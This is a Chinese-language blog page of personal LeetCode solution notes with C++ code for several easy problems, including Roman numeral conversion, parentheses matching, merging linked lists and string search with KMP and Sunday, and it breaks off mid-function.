<h2 id="13-罗马数字转整数"><a href="#13-罗马数字转整数" class="headerlink" title="13. 罗马数字转整数"></a>13. 罗马数字转整数</h2><p>一位位处理即可，遇到IXC，就再看下一位一起处理。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">romanToInt</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//遍历，假设当前字符为c1，下个字符为c2</span></span><br><span class="line">        <span class="comment">//c1=I, 若c2=V,X, 4和9</span></span><br><span class="line">        <span class="comment">//c1=X, 若c2=L,C, 40和90</span></span><br><span class="line">        <span class="comment">//c1=C, 若c2=D,M, 400和900</span></span><br><span class="line">        <span class="comment">//其他, +对应</span></span><br><span class="line">        <span class="keyword">int</span> N = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.length(); )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">switch</span> (s[i])</span><br><span class="line">            &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'I'</span>:</span><br><span class="line">                help(i, s, N, <span class="string">'V'</span>, <span class="string">'X'</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'X'</span>:</span><br><span class="line">                help(i, s, N, <span class="string">'L'</span>, <span class="string">'C'</span>, <span class="number">40</span>, <span class="number">90</span>, <span class="number">10</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'C'</span>:</span><br><span class="line">                help(i, s, N, <span class="string">'D'</span>, <span class="string">'M'</span>, <span class="number">400</span>, <span class="number">900</span>, <span class="number">100</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'V'</span>:</span><br><span class="line">                N += <span class="number">5</span>;</span><br><span class="line">                i++;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'L'</span>:</span><br><span class="line">                N += <span class="number">50</span>;</span><br><span class="line">                i++;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'D'</span>:</span><br><span class="line">                N += <span class="number">500</span>;</span><br><span class="line">                i++;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'M'</span>:</span><br><span class="line">                N += <span class="number">1000</span>;</span><br><span class="line">                i++;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> N;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">help</span><span class="params">(<span class="keyword">int</span>&amp; i, <span class="built_in">string</span>&amp; s, <span class="keyword">int</span>&amp; N, <span class="keyword">char</span> c1, <span class="keyword">char</span> c2, <span class="keyword">int</span> n1, <span class="keyword">int</span> n2, <span class="keyword">int</span> n3)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (i+<span class="number">1</span> &lt; s.length())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (s[i+<span class="number">1</span>] == c1)</span><br><span class="line">            &#123;</span><br><span class="line">                N += n1;</span><br><span class="line">                i += <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (s[i+<span class="number">1</span>] == c2)</span><br><span class="line">            &#123;</span><br><span class="line">                N += n2;</span><br><span class="line">                i += <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                N += n3;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            N += n3;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<hr>
<p>上面的方法写的不够简洁，遇到改需求（比如IXC之类的改成别的字符会比较麻烦）会大改代码，看了一篇写的挺简洁的，即把我的help函数改成查表法，值得注意的是第14行的<code>if (i+1 &lt; s.length() &amp;&amp; hash[s[i]-&#39;C&#39;] &lt; hash[s[i+1]-&#39;C&#39;])</code>的第二个条件，假如出现小面额在大面额之前的情况，我一开始以为这个写法有漏洞，比如IM这种情况，后来想想这种情况不属于合法输入，所以可以。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">romanToInt</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> s1[] = &#123;<span class="number">1</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">100</span>, <span class="number">500</span>, <span class="number">1000</span>&#125;;</span><br><span class="line">        <span class="keyword">int</span> s2[] = &#123;<span class="string">'I'</span>,<span class="string">'V'</span>,<span class="string">'X'</span>,<span class="string">'L'</span>,<span class="string">'C'</span>,<span class="string">'D'</span>,<span class="string">'M'</span>&#125;;</span><br><span class="line">        <span class="keyword">int</span> hash[<span class="string">'X'</span>-<span class="string">'C'</span>+<span class="number">1</span>] = &#123;<span class="number">0</span>&#125;; </span><br><span class="line">        <span class="keyword">int</span> N = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(s1)/<span class="keyword">sizeof</span>(s1[<span class="number">0</span>]); i++)</span><br><span class="line">        &#123;</span><br><span class="line">            hash[s2[i]-<span class="string">'C'</span>] = s1[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.length(); )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i+<span class="number">1</span> &lt; s.length() &amp;&amp; hash[s[i]-<span class="string">'C'</span>] &lt; hash[s[i+<span class="number">1</span>]-<span class="string">'C'</span>])</span><br><span class="line">            &#123;   <span class="comment">//第二个判断条件是基于不会有非法输入，比如IM之类的出现</span></span><br><span class="line">                N += hash[s[i+<span class="number">1</span>]-<span class="string">'C'</span>] - hash[s[i]-<span class="string">'C'</span>];</span><br><span class="line">                i += <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                N += hash[s[i]-<span class="string">'C'</span>];</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> N;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="14-最长公共前缀"><a href="#14-最长公共前缀" class="headerlink" title="14. 最长公共前缀"></a>14. 最长公共前缀</h2><p>从下标0开始一列列对比</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">longestCommonPrefix</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt;&amp; strs)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (strs.size() == <span class="number">0</span> || strs[<span class="number">0</span>].length() == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> idx = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">bool</span> flag = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">while</span> (flag)</span><br><span class="line">        &#123;</span><br><span class="line">            idx++;</span><br><span class="line">            <span class="keyword">char</span> c = strs[<span class="number">0</span>][idx];</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; strs.size(); i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (idx &gt;= strs[i].length() || strs[i][idx] != c)</span><br><span class="line">                &#123;</span><br><span class="line">                    flag = <span class="literal">false</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> strs[<span class="number">0</span>].substr(<span class="number">0</span>, idx);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="20-有效的括号"><a href="#20-有效的括号" class="headerlink" title="20. 有效的括号"></a>20. 有效的括号</h2><p>用一个栈，遇到左括号入栈，遇到右括号看栈是否为空and栈顶是否为对应左括号。最后看栈是否为空</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isValid</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">stack</span>&lt;<span class="keyword">char</span>&gt; st;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> c : s)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">switch</span> (c)</span><br><span class="line">            &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'('</span>: st.push(c); <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'['</span>: st.push(c); <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'&#123;'</span>: st.push(c); <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">')'</span>:</span><br><span class="line">                <span class="keyword">if</span> (st.empty() || st.top() != <span class="string">'('</span>) </span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    st.pop();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">']'</span>:</span><br><span class="line">                <span class="keyword">if</span> (st.empty() || st.top() != <span class="string">'['</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    st.pop();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'&#125;'</span>:</span><br><span class="line">                <span class="keyword">if</span> (st.empty() || st.top() != <span class="string">'&#123;'</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    st.pop();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;          </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> st.empty();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<hr>
<p>可以加一些判断过滤：</p>
<ol>
<li>s.length()为奇数</li>
<li>栈深度大于s.length()/2时，后面有再多的右括号也消化不了</li>
<li>栈深度大于剩余长度时，后面有再多的右括号也消化不了（强于2）</li>
</ol>
<p>但其实没怎么改进速度</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isValid</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (s == <span class="string">""</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (s.length() % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">stack</span>&lt;<span class="keyword">char</span>&gt; st;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.length(); i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> c = s[i];</span><br><span class="line">            <span class="keyword">switch</span> (c)</span><br><span class="line">            &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'('</span>: st.push(c); <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'['</span>: st.push(c); <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'&#123;'</span>: st.push(c); <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">')'</span>:</span><br><span class="line">                <span class="keyword">if</span> (st.empty() || st.top() != <span class="string">'('</span>) </span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    st.pop();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">']'</span>:</span><br><span class="line">                <span class="keyword">if</span> (st.empty() || st.top() != <span class="string">'['</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    st.pop();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'&#125;'</span>:</span><br><span class="line">                <span class="keyword">if</span> (st.empty() || st.top() != <span class="string">'&#123;'</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    st.pop();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;          </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (st.size() &gt; s.length() - i - <span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> st.empty();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="21-合并两个有序链表"><a href="#21-合并两个有序链表" class="headerlink" title="21. 合并两个有序链表"></a>21. 合并两个有序链表</h2><p>逐个比较两个链表的当前元素，小的插入新链表，然后当前元素后移一位</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">mergeTwoLists</span><span class="params">(ListNode* l1, ListNode* l2)</span> </span>&#123;</span><br><span class="line">        ListNode* p1 = l1, *p2 = l2;</span><br><span class="line">        ListNode* merge = <span class="keyword">new</span> ListNode(<span class="number">-1</span>);</span><br><span class="line">        ListNode* tail = merge;</span><br><span class="line">        <span class="keyword">while</span> (p1 != <span class="literal">NULL</span> &amp;&amp; p2 != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (p1-&gt;val &lt; p2-&gt;val)</span><br><span class="line">            &#123;</span><br><span class="line">                ListNode* tmp = <span class="keyword">new</span> ListNode(p1-&gt;val);</span><br><span class="line">                tail-&gt;next = tmp;</span><br><span class="line">                tail = tmp;</span><br><span class="line">                p1 = p1-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                ListNode* tmp = <span class="keyword">new</span> ListNode(p2-&gt;val);</span><br><span class="line">                tail-&gt;next = tmp;</span><br><span class="line">                tail = tmp;</span><br><span class="line">                p2 = p2-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (p1 != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            ListNode* tmp = <span class="keyword">new</span> ListNode(p1-&gt;val);</span><br><span class="line">            tail-&gt;next = tmp;</span><br><span class="line">            tail = tmp;</span><br><span class="line">            p1 = p1-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (p2 != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            ListNode* tmp = <span class="keyword">new</span> ListNode(p2-&gt;val);</span><br><span class="line">            tail-&gt;next = tmp;</span><br><span class="line">            tail = tmp;</span><br><span class="line">            p2 = p2-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        ListNode* ret = merge-&gt;next;</span><br><span class="line">        <span class="keyword">delete</span> merge;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>上面的写法没有利用l1和l2的空间，下面重复利用l1和l2的空间。用一个指针prev记录上一个选中的节点，然后选中当前节点cur后，将prev-&gt;next=cur。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">mergeTwoLists</span><span class="params">(ListNode* l1, ListNode* l2)</span> </span>&#123;</span><br><span class="line">        ListNode* p1 = l1, *p2 = l2;</span><br><span class="line">        ListNode* merge = <span class="keyword">new</span> ListNode(<span class="number">-1</span>);</span><br><span class="line">        ListNode* prev = merge;</span><br><span class="line">        <span class="keyword">while</span> (p1 != <span class="literal">NULL</span> &amp;&amp; p2 != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (p1-&gt;val &lt; p2-&gt;val)</span><br><span class="line">            &#123;</span><br><span class="line">                prev-&gt;next = p1;</span><br><span class="line">                prev = p1;</span><br><span class="line">                p1 = p1-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                prev-&gt;next = p2;</span><br><span class="line">                prev = p2;</span><br><span class="line">                p2 = p2-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (p1 != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            prev-&gt;next = p1;</span><br><span class="line">            prev = p1;</span><br><span class="line">            p1 = p1-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (p2 != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            prev-&gt;next = p2;</span><br><span class="line">            prev = p2;</span><br><span class="line">            p2 = p2-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        ListNode* ret = merge-&gt;next;</span><br><span class="line">        <span class="keyword">delete</span> merge;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="27-移除元素"><a href="#27-移除元素" class="headerlink" title="27. 移除元素"></a>27. 移除元素</h2><p>迭代器的使用</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">removeElement</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> p = nums.begin(); p != nums.end(); )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (*p == val)</span><br><span class="line">            &#123;</span><br><span class="line">                p = nums.erase(p);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                ++p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> nums.size();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<hr>
<p>第二种办法，注意到题目里说元素顺序可以改变，所以可以不真正删除元素，而是把元素调到数组的最后面去（用时反而比上面的解法慢，不解）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">removeElement</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> p1 = <span class="number">0</span>, p2 = nums.size() - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> revNum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (p1 &lt;= p2)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[p1] == val)</span><br><span class="line">            &#123;</span><br><span class="line">                revNum++;</span><br><span class="line">                <span class="keyword">while</span> (nums[p2] == val &amp;&amp; p1 &lt; p2)</span><br><span class="line">                &#123;</span><br><span class="line">                    p2--;</span><br><span class="line">                    revNum++;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (p1 &lt; p2)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">std</span>::swap(nums[p1], nums[p2]);</span><br><span class="line">                    p2--;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            p1++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> nums.size() - revNum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="28-实现strStr"><a href="#28-实现strStr" class="headerlink" title="28. 实现strStr()"></a>28. 实现strStr()</h2><p>改进的kmp</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    int strStr(string haystack, string needle) &#123;</span><br><span class="line">        if (needle == &quot;&quot;) return 0;</span><br><span class="line">        string&amp; txt = haystack;</span><br><span class="line">        string&amp; pat = needle;</span><br><span class="line">        int n = txt.length();</span><br><span class="line">        int m = pat.length();</span><br><span class="line">        auto dp = new int[m][256];</span><br><span class="line">        memset(dp, 0, m*256*sizeof(int));</span><br><span class="line"></span><br><span class="line">        dp[0][pat[0]] = 1;</span><br><span class="line">        int X = 0;</span><br><span class="line">        for (int i = 1; i &lt; m; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            for (int c = 0; c &lt; 256; c++)</span><br><span class="line">            &#123;</span><br><span class="line">                if (c == pat[i])</span><br><span class="line">                    dp[i][c] = i + 1;</span><br><span class="line">                else</span><br><span class="line">                    dp[i][c] = dp[X][c];</span><br><span class="line">            &#125;</span><br><span class="line">            X = dp[X][pat[i]];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        int j = 0;</span><br><span class="line">        for (int i = 0; i &lt; n; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            j = dp[j][txt[i]];</span><br><span class="line">            if (j == m)</span><br><span class="line">            &#123;</span><br><span class="line">                return i - m + 1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return -1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>sunday</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">strStr</span><span class="params">(<span class="built_in">string</span> haystack, <span class="built_in">string</span> needle)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (needle == <span class="string">""</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> n = haystack.length();</span><br><span class="line">        <span class="keyword">int</span> m = needle.length();</span><br><span class="line">        <span class="keyword">if</span> (n &lt; m) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> sunday[<span class="number">256</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            sunday[i] = <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            sunday[needle[i]] = m - i;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> ( ; i+j &lt; n &amp;&amp; j &lt; m; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (haystack[i+j] != needle[j])</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (j == m)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (i+m &lt; n)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (sunday[haystack[i+m]] != <span class="number">-1</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    i = i + sunday[haystack[i+m]];</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    i = i + m;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="35-搜索插入位置"><a href="#35-搜索插入位置" class="headerlink" title="35. 搜索插入位置"></a>35. 搜索插入位置</h2><p>二分查找递归版</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">searchInsert</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (nums.size() == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (target &lt; nums[<span class="number">0</span>]) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (target &gt; nums[nums.size()<span class="number">-1</span>]) <span class="keyword">return</span> nums.size();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> re(nums, <span class="number">0</span>, nums.size() - <span class="number">1</span>, target);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">re</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span 